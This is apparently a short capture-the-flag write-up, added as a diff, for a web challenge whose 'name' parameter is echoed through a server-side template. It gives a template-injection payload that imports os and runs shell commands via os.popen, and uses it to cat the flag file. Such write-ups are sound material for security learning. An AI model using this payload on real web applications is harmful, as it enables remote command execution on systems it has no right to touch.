@@ -1,0 +1,28 @@
+This challenge is available at http://140.238.254.6:8011/ last checked at the time of commit
+challenge hint|- Feed your 'name' to the website and hack!
+
+the index page is quite EMPTY ! with nothing in the source as well !
+except a *HELLO*
+
+https://user-images.githubusercontent.com/63468638/79013469-70693a80-7b86-11ea-965e-9af5e7a55e36.png
+
+but the challenge hint gives us a path to try
+we make a get request to enter out name
+/?name=defalt
+
+which the page responds by changing to
+Hello defalt
+
+https://user-images.githubusercontent.com/63468638/79013497-837c0a80-7b86-11ea-9523-ac3fad6c0002.png
+
+this gives us a idea that the service might be vulnerable to SSE
+
+so we use this payload to execute our commands
+/?name={%import%20os%}{{os.popen(%22*COMMAND*%22).read()}}
+
+then we use ls and cat to get our flag !
+
+/?name={%import%20os%}{{os.popen(%22cat flag.txt%22).read()}}
+
+d33p{I_<3_3000}
+We love you too d33p !!
